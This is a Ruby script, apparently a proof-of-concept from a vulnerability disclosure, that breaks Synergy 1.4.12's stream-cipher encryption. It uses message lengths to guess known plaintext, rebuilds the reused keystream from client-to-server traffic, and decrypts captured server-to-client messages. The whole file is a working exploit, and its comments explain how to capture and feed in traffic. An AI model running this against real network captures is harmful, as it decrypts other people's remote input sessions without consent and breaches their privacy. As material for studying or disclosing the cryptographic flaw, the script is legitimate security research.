#!/usr/bin/env ruby
# Synergy 1.4.12 cracker by @DefuseSec. Requires Ruby >= 2.0.
#
# This script takes as input the server-to-client and client-to-server TCP byte
# streams and decrypts almost everything up to the first IV change. The IV is
# changed before every key event, so this means everything up to the first key
# event, including mouse movements, can be easily decrypted.
#
# This script works with CTR, OFB, and GCM modes.
#
# To use this script, capture the conversation between the Synergy client and
# Synergy server with a tool like wireshark. Then use `tcptrace` to extract the
# byte streams from the packet capture. Pass the server-to-client stream file as
# the first argument to this script, and the client-to-server stream file as the
# second argument to this script.

# XOR two byte strings.
def xor(x,y)
  if x.length != y.length
    raise 'Strings are not the same length'
  end
  xorsum = ""
  i = 0
  while i < x.length
    xorsum << (x[i].ord ^ y[i].ord).chr
    i += 1
  end
  return xorsum.b
end

# Break a Synergy TCP stream into its discrete 'messages'.
def parse_into_messages( stream )
  # The format is (<l><ct>)*, where <l> is a 4-byte big-endian integer L, and
  # <ct> is an L-byte ciphertext.
  messages = []
  position = 0
  while position < stream.length
    length = stream[position, 4].unpack("l>")[0]
    position += 4
    messages << stream[position, length]
    position += length
  end
  return messages
end

# Given the client-to-server messages, re-construct the keystream where the 
# corresponding plaintext is known.
def reconstruct_keystream(ctos_messages)
  keystream = ""
  ctos_messages.each do |ciphertext|
    # Use the message length as a side-channel to predict the plaintext.
    case ciphertext.length
    when 4 # CNOP or CALV
      # It can be CNOP or CALV, but CNOP is way more common, so we use that.
      keystream << xor(ciphertext, "CNOP")
    when 23 # The first "Synergy..." thing that gets sent
      keystream << xor(ciphertext, "Synergy\x00\x01\x00\x04\x00\x00\x00\x08\x73\x79\x6e\x65\x72\x67\x79\x32")
    when 18 # DINF...
      # The last part varies, but can be guessed if you really need it.
      keystream << xor(ciphertext, "DINF" + "\x00" * 14)
    else
      keystream << "\x00" * ciphertext.length
    end
  end
  return keystream
end

# Given a keystream, decrypt server-to-client messages.
def decrypt(stoc_messages, keystream)
  keystream_pos = 0
  stoc_messages.each do |ciphertext|
    if keystream_pos + ciphertext.length > keystream.length
      puts "Ran out of keystream, stopping."
      return
    end
    keystream_this = keystream[keystream_pos, ciphertext.length]
    keystream_pos += ciphertext.length
    plaintext = xor(ciphertext, keystream_this)
    p plaintext
    # After the server-to-client IV has been changed, the client-to-server
    # keystream no longer corresponds to the server-to-client keystream, so we
    # can't continue.
    if ciphertext.length == 24
      puts "IV change detected, stopping."
      return
    end
  end
end

if ARGV.length != 2
  puts "Usage: ./crack.rb server-to-client client-to-server"
  exit 1
end

stoc_stream = File.open( ARGV[0], "rb") { |f| f.read.b }
ctos_stream = File.open( ARGV[1], "rb") { |f| f.read.b }

stoc_messages =  parse_into_messages(stoc_stream)
ctos_messages = parse_into_messages(ctos_stream)

keystream = reconstruct_keystream(ctos_messages)
decrypt(stoc_messages, keystream)
